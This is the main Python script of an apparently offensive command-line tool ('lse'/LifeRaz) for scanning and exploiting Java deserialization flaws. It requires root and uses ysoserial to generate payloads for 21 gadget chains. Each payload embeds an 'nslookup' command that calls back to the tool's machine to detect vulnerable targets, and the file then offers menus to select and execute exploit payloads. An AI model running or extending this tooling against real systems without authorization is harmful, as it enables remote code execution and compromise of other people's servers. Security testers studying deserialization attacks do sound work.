import requests
import sys
import os
import socket
import shutil
import time
import logging
from core import help
from core import header
from core import scan as sc
from core import exploit as ex


# Config logging
def logging_config():
    logs = "{}/log".format(os.getcwd())
    check_logs = os.path.exists(logs)
    datetime = time.strftime("%d-%m-%Y-%H:%M:%S")
    logfile = "{}/log/{}.log".format(os.getcwd(), datetime)
    if check_logs is True:
        file_logging = os.path.join(os.path.dirname(__file__), logfile)
        logging.basicConfig(filename=file_logging, filemode='w', level=logging.DEBUG)
        print('\033[93m' + "<*> Creating log file successfully!")
    else:
        os.makedirs("{}/log".format(os.getcwd()))
        logging_config()


# Generate DNS payload of java deserialization vul before main() with computer's ip running tool
def pre_main():
    print('\033[93m' + "<*> Generate payloads for scanning!")
    print("")
    try:
        os.makedirs("{}/core/payload_ping/".format(os.getcwd()))
    except FileExistsError:
        shutil.rmtree("{}/core/payload_ping/".format(os.getcwd()))
        os.makedirs("{}/core/payload_ping/".format(os.getcwd()))

    hostname = socket.gethostname()
    ip_add = socket.gethostbyname(hostname)
    # ping_list = ["BeanShell1", "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
    #              "Hibernate1",
    #              "Hibernate2",
    #              "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]
    ping_list = ["CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
                 "CommonsCollections4", "Jdk7u21", "ROME", "Spring1", "Spring2", "BeanShell1",
                 "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
                 "Hibernate1", "Hibernate2", "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]

    for name in ping_list:
        command = "java -jar {}/ysoserial-master-55f1e7c35c-1.jar {} 'nslookup google.com {}' > core/payload_ping/{}.bin".format(
            os.getcwd(), name.strip(),ip_add, name)
        os.system(command)
    os.system("clear")


# Functions when choosing a payload
def use_payload():
    try:
        path_func = '\033[94m' + "lse" + '\033[91m' + "(exploit/payload)" + '\033[93m' + "> "
        terminal = input(path_func)
        if terminal == "help":
            help.use_payload()
        elif terminal[0:3] == "set":
            list_input = terminal.split(" ")
            vul_option = list_input[1].strip()
            vul_method = vul_option + '_gs'
            if ex.check_exist_option(vul_option):
                option_value = list_input[2].strip()
                setattr(ex.vul, vul_method, option_value)
            else:
                print("Option is not defined")
                use_payload()
        elif terminal == "show options":
            ex.vul.show_options()
        elif terminal == "execute":
            ex.vul.execute()
        elif terminal == "clr":
            os.system("clear")
            header.show()
        elif terminal == "back":
            exploit()
        elif terminal == "clean":
            try:
                shutil.rmtree("{}/log".format(os.getcwd()))
                print("-> Clean logs successfully!")
            except FileNotFoundError:
                print("-> No logs to clean!")
        elif terminal == "exit":
            sys.exit(0)
        else:
            print("Command not found")
            use_payload()
        use_payload()
    except KeyboardInterrupt:
        print('\n')
        return use_payload()


# Exploit function
def exploit():
    path_func = '\033[94m' + "lse" + '\033[91m' + "(exploit)" + '\033[93m' + "> "
    try:
        terminal = input(path_func).lower()
        if terminal == "help":
            help.exploit()
        elif terminal[0:4] == "show":
            if terminal[5:] == "all":
                help.payload_list()
            elif terminal[5:].strip().isdigit():
                payload_order = int(terminal[5:])
                if ex.total >= payload_order > 0:
                    ex.get_detail_payload(payload_order)
                else:
                    print("Order of Payload is not correct")
                    exploit()
            else:
                print("Command not found")
                exploit()
        elif terminal[0:3] == "use":
            if terminal[3:].strip().isdigit():
                payload_order = int(terminal[3:])
                latest_url = "http(s)://example.com.vn"
                ex.payload_choose(payload_order)
                use_payload()
        elif terminal == "back":
            main()
        elif terminal == "clean":
            try:
                shutil.rmtree("{}/log".format(os.getcwd()))
                print("-> Clean logs successfully!")
            except FileNotFoundError:
                print("-> No logs to clean!")
        elif terminal == "exit":
            sys.exit(0)
        elif terminal == "clr":
            os.system("clear")
            header.show()
            exploit()
        else:
            print("Command not found")
            exploit()
        exploit()
    except KeyboardInterrupt:
        print('\n')
        return exploit()


# Scan function
def scan():
    path_func = '\033[94m' + "lse" + '\033[91m' + "(scan)" + '\033[93m' + "> "
    terminal = input(path_func).lower()
    if terminal == "help":
        help.scan()
    elif terminal[0:3] == "set":
        list_input = terminal.split(" ")
        scan_option = list_input[1].strip()
        scan_method = scan_option + '_gs'
        if sc.check_exist_option(scan_option):
            option_value = list_input[2].strip()
            setattr(sc.scan, scan_method, option_value)
        else:
            print("Option is not defined")
            scan()
    elif terminal == "execute":
        sc.scan.main()
    elif terminal == "show options":
        sc.scan.show_options()
    elif terminal == "back":
        main()
    elif terminal == "clr":
        os.system("clear")
        header.show()
        scan()
    elif terminal == "clean":
        try:
            shutil.rmtree("{}/log".format(os.getcwd()))
            print("-> Clean logs successfully!")
        except FileNotFoundError:
            print("-> No logs to clean!")
    elif terminal == "exit":
        print("Existing....!")
        time.sleep(1)
        sys.exit(0)
    else:
        print("Command not found")
        scan()
    scan()


# Main function
def main():
    try:
        path_func = '\033[94m' + "lse" + '\033[93m' + "> "
        terminal = input(path_func).lower()
        if terminal == "help":
            help.home()
            main()
        elif terminal == "scan":
            sc.scan_choose()
            scan()
        elif terminal == "exploit":
            exploit()
        elif terminal == "clr":
            os.system("clear")
            header.show()
            main()
        elif terminal == "clean":
            try:
                shutil.rmtree("{}/log".format(os.getcwd()))
                print("-> Clean logs successfully!")
            except FileNotFoundError:
                print("-> No logs to clean!")
        elif terminal == "exit":
            print("Existing....!")
            time.sleep(1)
            sys.exit(0)
        else:
            print("Command not found")
            main()
        main()
    # except IndexError:
    #     print("Option cannot empty")
    except KeyboardInterrupt:
        print('\n')
        return main()


if __name__ == '__main__':
    if not os.geteuid() == 0:
        sys.exit("LifeRaz requires root privileges!")
    logging_config()
    pre_main()
    header.show()
    main()
